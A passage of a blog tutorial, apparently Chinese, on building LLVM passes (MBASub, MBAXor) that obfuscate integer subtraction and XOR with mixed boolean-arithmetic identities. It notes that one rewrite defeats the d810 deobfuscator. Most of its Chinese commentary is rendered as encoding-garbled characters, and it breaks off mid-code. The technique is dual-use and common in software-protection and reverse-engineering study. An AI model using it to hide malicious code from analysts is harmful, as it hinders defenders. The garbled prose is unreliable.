å‡½æ•°)ï¼Œå¹¶å°†å…¶æ·»åŠ åˆ° Pass ç®¡ç†å™¨ä¸­</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                    <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>                  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                  <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>          <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h5 id=\"passinfomixinç›¸å…³\"><a class=\"markdownIt-Anchor\" href=\"#passinfomixinç›¸å…³\">#</a> PassInfoMixin ç›¸å…³</h5>\n<blockquote>\n<p>All LLVM passes inherit from the CRTP mix-in  <code>PassInfoMixin&lt;PassT&gt;</code> . The pass should have a  <code>run()</code>  method which returns a  <code>PreservedAnalyses</code>  and takes in some unit of IR along with an analysis manager.</p>\n</blockquote>\n<p>PassInfoMixin æ¨¡æ¿ç±»ç®€åŒ–æ³¨å†Œè¿‡ç¨‹</p>\n<p>ç»§æ‰¿äº† PassInfoMixin çš„ç±»æˆ‘ä»¬å°±å¯ä»¥è§†ä¸ºæ˜¯ä¸€ä¸ª Pass</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//mixin çš„ä½œç”¨æ˜¯å½“å¤šä¸ªç»„ä»¶éƒ½éœ€è¦ç›¸åŒçš„æ•°æ®æˆ–è€…æŸäº›åŠŸèƒ½çš„è¯å°±å¯ä»¥æŠŠè¿™äº›å†…å®¹æå–å‡ºæ¥å†™æˆä¸€ä¸ª mixin, è™½ç„¶ C++ æ²¡æœ‰è¿™ç§ç‰¹æ€§ï¼Œä½†é€šè¿‡ç‰¹æ®ŠæŠ€å·§å®ç°äº†ï¼Œæš‚ä¸”ä¸ç®¡</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">MBASub</span> <span class=\"token operator\">:</span> <span class=\"token base-clause\"><span class=\"token keyword\">public</span> llvm<span class=\"token double-colon punctuation\">::</span><span class=\"token class-name\">PassInfoMixin</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">MBASub</span><span class=\"token operator\">></span></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>     <span class=\"token comment\">// å®šä¹‰äº†ä¸€ä¸ªç»“æ„ä½“ MBASubï¼Œå¹¶é€šè¿‡ llvm::PassInfoMixin ç±»æ¥ç»§æ‰¿ä¸€äº› Pass ç›¸å…³çš„ä¿¡æ¯</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token comment\">//Pass æ’ä»¶ä¸»å…¥å£ç‚¹ï¼Œä¸ºå›è°ƒå‡½æ•°ï¼Œä¼šæŠŠæºç çš„å‡½æ•° IR å¯¹è±¡å’Œå’Œå‡½æ•°å‡½æ•°ç®¡ç†å¯¹è±¡ä¼ é€’æ­¤å‡½æ•°</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  llvm<span class=\"token double-colon punctuation\">::</span>PreservedAnalyses <span class=\"token function\">run</span><span class=\"token punctuation\">(</span>llvm<span class=\"token double-colon punctuation\">::</span>Function <span class=\"token operator\">&amp;</span>F<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                              llvm<span class=\"token double-colon punctuation\">::</span>FunctionAnalysisManager <span class=\"token operator\">&amp;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">bool</span> <span class=\"token function\">runOnBasicBlock</span><span class=\"token punctuation\">(</span>llvm<span class=\"token double-colon punctuation\">::</span>BasicBlock <span class=\"token operator\">&amp;</span>B<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">static</span> <span class=\"token keyword\">bool</span> <span class=\"token function\">isRequired</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span><span class=\"token comment\">//isRequired æ˜¯å¯é€‰çš„ï¼Œä¸å®ç°åˆ™ä¼šæ˜¯é»˜è®¤ false</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>è¡¥å…… PassInfoMixin çš„å£°æ˜ä½œå‚è€ƒ</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/// A CRTP mix-in to automatically provide informational APIs needed for</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">/// passes.</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">///</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">/// This provides some boilerplate for types that are passes.</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">template</span> <span class=\"token operator\">&lt;</span><span class=\"token keyword\">typename</span> <span class=\"token class-name\">DerivedT</span><span class=\"token operator\">></span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">PassInfoMixin</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token comment\">/// Gets the name of the pass we are mixed into.</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">static</span> StringRef <span class=\"token function\">name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">static_assert</span><span class=\"token punctuation\">(</span>std<span class=\"token double-colon punctuation\">::</span>is_base_of<span class=\"token operator\">&lt;</span>PassInfoMixin<span class=\"token punctuation\">,</span> DerivedT<span class=\"token operator\">></span><span class=\"token double-colon punctuation\">::</span>value<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>                  <span class=\"token string\">\"Must pass the derived type as the template argument!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    StringRef Name <span class=\"token operator\">=</span> <span class=\"token generic-function\"><span class=\"token function\">getTypeName</span><span class=\"token generic class-name\"><span class=\"token operator\">&lt;</span>DerivedT<span class=\"token operator\">></span></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    Name<span class=\"token punctuation\">.</span><span class=\"token function\">consume_front</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"llvm::\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">return</span> Name<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre> </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token function\">printPipeline</span><span class=\"token punctuation\">(</span>raw_ostream <span class=\"token operator\">&amp;</span>OS<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                     function_ref<span class=\"token operator\">&lt;</span><span class=\"token function\">StringRef</span><span class=\"token punctuation\">(</span>StringRef<span class=\"token punctuation\">)</span><span class=\"token operator\">></span> MapClassName2PassName<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    StringRef ClassName <span class=\"token operator\">=</span> <span class=\"token class-name\">DerivedT</span><span class=\"token double-colon punctuation\">::</span><span class=\"token function\">name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">auto</span> PassName <span class=\"token operator\">=</span> <span class=\"token function\">MapClassName2PassName</span><span class=\"token punctuation\">(</span>ClassName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    OS <span class=\"token operator\">&lt;&lt;</span> PassName<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h5 id=\"replaceinstwithinstå‡½æ•°\"><a class=\"markdownIt-Anchor\" href=\"#replaceinstwithinstå‡½æ•°\">#</a> ReplaceInstWithInst å‡½æ•°</h5>\n<pre><code class=\"language-c++\">void \tllvm::ReplaceInstWithInst (BasicBlock *BB, BasicBlock::iterator &amp;BI, Instruction *I)\n \tReplace the instruction specified by BI with the instruction specified by I.   (å°†BIæŒ‡å®šçš„æŒ‡ä»¤æ›¿æ¢ä¸ºIæŒ‡å®šçš„æŒ‡ä»¤)\n</code></pre>\n<h5 id=\"run-method-which-returns-a-preservedanalyseså®ç°\"><a class=\"markdownIt-Anchor\" href=\"#run-method-which-returns-a-preservedanalyseså®ç°\">#</a> run () method which returns a PreservedAnalyses å®ç°</h5>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//--------------</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>PreservedAnalyses <span class=\"token class-name\">MBASub</span><span class=\"token double-colon punctuation\">::</span><span class=\"token function\">run</span><span class=\"token punctuation\">(</span>llvm<span class=\"token double-colon punctuation\">::</span>Function <span class=\"token operator\">&amp;</span>F<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>                              llvm<span class=\"token double-colon punctuation\">::</span>FunctionAnalysisManager <span class=\"token operator\">&amp;</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//ModulePass éœ€è¦è¿™é‡Œæ˜¯ llvm::Module å’Œ ModuleAnalysisManagerï¼ŒFunctionPass éœ€è¦è¿™é‡Œæ˜¯ Function å’Œ FunctionAnalysisManager</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">bool</span> Changed <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>std<span class=\"token double-colon punctuation\">::</span>cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"HAHAHAHAHAHAHAHAHA MyPass Loaded\"</span> <span class=\"token operator\">&lt;&lt;</span> std<span class=\"token double-colon punctuation\">::</span>endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">auto</span> <span class=\"token operator\">&amp;</span>BB <span class=\"token operator\">:</span> F<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    Changed <span class=\"token operator\">|=</span> <span class=\"token function\">runOnBasicBlock</span><span class=\"token punctuation\">(</span>BB<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>Changed <span class=\"token operator\">?</span> llvm<span class=\"token double-colon punctuation\">::</span><span class=\"token class-name\">PreservedAnalyses</span><span class=\"token double-colon punctuation\">::</span><span class=\"token function\">none</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>                  <span class=\"token operator\">:</span> llvm<span class=\"token double-colon punctuation\">::</span><span class=\"token class-name\">PreservedAnalyses</span><span class=\"token double-colon punctuation\">::</span><span class=\"token function\">all</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//run å‡½æ•°è¿”å›ä¸€ä¸ª PreservedAnalyses ç»“æ„è¡¨ç¤ºå“ªäº› Analysis Pass çš„ç»“æœæœ‰å˜åŒ–ã€‚æ¯”å¦‚æ²¡æœ‰ä»»ä½•æ”¹å˜ï¼Œå¯ä»¥è¿”å› PreservedAnalyses::all () è¡¨ç¤ºä¿ç•™å…¨éƒ¨åˆ†æç»“æœï¼›å¦‚æœå˜åŒ–äº†ï¼Œå¯ä»¥è¿”å› PreservedAnalyses::none () è¡¨ç¤ºåˆ†æç»“æœå…¨éƒ¨å¤±æ•ˆï¼Œéœ€è¦é‡æ–°è®¡ç®—ã€‚</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h5 id=\"mbasubå®ç°\"><a class=\"markdownIt-Anchor\" href=\"#mbasubå®ç°\">#</a> MBASub å®ç°</h5>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//-----------------------------------------------------------------------------</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// MBASub å®ç°</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">//-----------------------------------------------------------------------------</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">bool</span> <span class=\"token class-name\">MBASub</span><span class=\"token double-colon punctuation\">::</span><span class=\"token function\">runOnBasicBlock</span><span class=\"token punctuation\">(</span>BasicBlock <span class=\"token operator\">&amp;</span>BB<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">bool</span> Changed <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">// åœ¨ LLVM ä¸­ï¼ŒBasicBlockï¼ˆåŸºæœ¬å—ï¼‰æ˜¯ä¸€ä¸ªåŸºæœ¬çš„æ§åˆ¶æµå•å…ƒï¼Œå®ƒåŒ…å«ä¸€ç³»åˆ—æŒ‰ç…§ç¨‹åºçš„æ§åˆ¶æµè·¯å¾„é¡ºåºæ’åˆ—çš„æŒ‡ä»¤ã€‚å› æ­¤ï¼Œåœ¨ LLVM ä¸­ï¼Œå°†åŸºæœ¬å—ä¸­çš„æŒ‡ä»¤ä½œä¸ºè¿­ä»£å™¨çš„å…ƒç´ æ˜¯å¾ˆè‡ªç„¶çš„é€‰æ‹©ï¼Œå› ä¸ºåŸºæœ¬å—å®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªæŒ‡ä»¤åºåˆ—</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token comment\">// å¾ªç¯å—ä¸­çš„æ‰€æœ‰æŒ‡ä»¤ã€‚ æ›¿æ¢æŒ‡ä»¤éœ€è¦è¿­ä»£å™¨</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">auto</span> Inst <span class=\"token operator\">=</span> BB<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> IE <span class=\"token operator\">=</span> BB<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> Inst <span class=\"token operator\">!=</span> IE<span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>Inst<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span><span class=\"token comment\">// åˆå§‹åŒ–äº†ä¸€ä¸ªåä¸º Inst çš„è¿­ä»£å™¨ï¼ŒæŒ‡å‘åŸºæœ¬å—ï¼ˆBBï¼‰ä¸­çš„æŒ‡ä»¤çš„èµ·å§‹ä½ç½®</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token comment\">//IE = BB.end (): è¿™é‡Œåˆå§‹åŒ–äº†å¦ä¸€ä¸ªåä¸º IE çš„è¿­ä»£å™¨ï¼ŒæŒ‡å‘åŸºæœ¬å—ä¸­æŒ‡ä»¤çš„ç»“æŸä½ç½®</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token comment\">// è·³è¿‡éäºŒå…ƒæŒ‡ä»¤</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">auto</span> <span class=\"token operator\">*</span>BinOp <span class=\"token operator\">=</span> <span class=\"token generic-function\"><span class=\"token function\">dyn_cast</span><span class=\"token generic class-name\"><span class=\"token operator\">&lt;</span>BinaryOperator<span class=\"token operator\">></span></span></span><span class=\"token punctuation\">(</span>Inst<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// åœ¨ LLVM ä¸­ï¼ŒBinaryOperator æ˜¯è¡¨ç¤ºäºŒå…ƒæ“ä½œç¬¦çš„ä¸€ç§ç‰¹æ®ŠæŒ‡ä»¤ç±»å‹ã€‚å®ƒç”¨äºè¡¨ç¤ºè¯¸å¦‚åŠ æ³•ã€å‡æ³•ã€ä¹˜æ³•ç­‰äºŒå…ƒæ“ä½œçš„æŒ‡ä»¤ã€‚BinaryOperator ç»§æ‰¿è‡ª Instruction ç±»ï¼Œå› æ­¤å®ƒæ˜¯æŒ‡ä»¤çš„ä¸€ç§</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>BinOp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token comment\">/// è·³è¿‡ä¸æ˜¯å‡æ³•ï¼Œæˆ–è€…ä¸æ˜¯æ•´æ•°çš„æŒ‡ä»¤</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> Opcode <span class=\"token operator\">=</span> BinOp<span class=\"token operator\">-></span><span class=\"token function\">getOpcode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>Opcode <span class=\"token operator\">!=</span> Instruction<span class=\"token double-colon punctuation\">::</span>Sub <span class=\"token operator\">||</span> <span class=\"token operator\">!</span>BinOp<span class=\"token operator\">-></span><span class=\"token function\">getType</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token function\">isIntegerTy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    IRBuilder<span class=\"token operator\">&lt;</span><span class=\"token operator\">></span> <span class=\"token function\">Builder</span><span class=\"token punctuation\">(</span>BinOp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// åˆ›å»ºäº†ä¸€ä¸ª IRBuilder å¯¹è±¡ï¼Œæ’å…¥æ–°çš„æŒ‡ä»¤ã€æ“ä½œæ•°ç­‰åˆ°å½“å‰åŸºæœ¬å—æ‰€éœ€çš„</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token comment\">// Create  (a + ~b) + 1</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    Instruction <span class=\"token operator\">*</span>NewValue <span class=\"token operator\">=</span> <span class=\"token class-name\">BinaryOperator</span><span class=\"token double-colon punctuation\">::</span><span class=\"token function\">CreateAdd</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        Builder<span class=\"token punctuation\">.</span><span class=\"token function\">CreateAdd</span><span class=\"token punctuation\">(</span>BinOp<span class=\"token operator\">-></span><span class=\"token function\">getOperand</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                          Builder<span class=\"token punctuation\">.</span><span class=\"token function\">CreateNot</span><span class=\"token punctuation\">(</span>BinOp<span class=\"token operator\">-></span><span class=\"token function\">getOperand</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token class-name\">ConstantInt</span><span class=\"token double-colon punctuation\">::</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>BinOp<span class=\"token operator\">-></span><span class=\"token function\">getType</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token comment\">// æ›¿æ¢ï¼</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token function\">ReplaceInstWithInst</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>BB<span class=\"token punctuation\">,</span> Inst<span class=\"token punctuation\">,</span> NewValue<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    Changed <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>   </pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>  <span class=\"token keyword\">return</span> Changed<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>é™„æ··æ·†æ•ˆæœ<img data-src=\"/images/image-20231214170831217.png\" alt=\"image-20231214170831217\"></p>\n<h4 id=\"mbaadd\"><a class=\"markdownIt-Anchor\" href=\"#mbaadd\">#</a> MBAAdd</h4>\n<p>(æœ‰ç‚¹ç¥äº† è¿™ä¸ªæŒ‡ä»¤æ›¿æ¢ d810 è§£ä¸äº†)</p>\n<p>è§ github</p>\n<h4 id=\"xor\"><a class=\"markdownIt-Anchor\" href=\"#xor\">#</a> XOR</h4>\n<p>[{c1: c5/2, c2: -c5/2, c3: -c5/2, c4: -c5}]<br>\n å…¶ä¸­ï¼Œc5 ä¸ºä»»æ„éé›¶å¸¸æ•°</p>\n<p>å¾—:</p>\n<p>x^y==x-y-2*(x|~y)-2</p>\n<p>MBAXor å®ç°</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//-----------------------------------------------------------------------------</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// MBAXor å®ç°</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">//-----------------------------------------------------------------------------</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">bool</span> <span class=\"token class-name\">MBAXor</span><span class=\"token double-colon punctuation\">::</span><span class=\"token function\">runOnBasicBlock</span><span class=\"token punctuation\">(</span>BasicBlock <span class=\"token operator\">&amp;</span>BB<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">bool</span> Changed <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">auto</span> Inst <span class=\"token operator\">=</span> BB<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> IE <span class=\"token operator\">=</span> BB<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> Inst <span class=\"token operator\">!=</span> IE<span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>Inst<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>   </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">auto</span> <span class=\"token operator\">*</span>BinOp <span class=\"token operator\">=</span> <span class=\"token generic-function\"><span class=\"token function\">dyn_cast</span><span class=\"token generic class-name\"><span class=\"token operator\">&lt;</span>BinaryOperator<span class=\"token operator\">></span></span></span><span class=\"token punctuation\">(</span>Inst<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>BinOp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> Opcode <span class=\"token operator\">=</span> BinOp<span class=\"token operator\">-></span><span class=\"token function\">getOpcode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>Opcode <span class=\"token operator\">!=</span> Instruction<span class=\"token double-colon punctuation\">::</span>Xor <span class=\"token operator\">||</span> <span class=\"token operator\">!</span>BinOp<span class=\"token operator\">-></span><span class=\"token function\">getType</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token function\">isIntegerTy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    IRBuilder<span class=\"token operator\">&lt;</span><span class=\"token operator\">></span> <span class=\"token function\">Builder</span><span class=\"token punctuation\">(</span>BinOp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre> <span class=\"token keyword\">auto</span> Val2 <span class=\"token operator\">=</span> <span class=\"token class-name\">ConstantInt</span><span class=\"token double-colon punctuation\">::</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>BinOp<span class=\"token operator\">-></span><span class=\"token function\">getType</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token comment\">// é€æ­¥æ‹†è§£  x-y-2*(x|~y)-2 å¯å˜æˆ x-(y+(2*(x|~y)+2))</span></pre></td></tr><tr><td 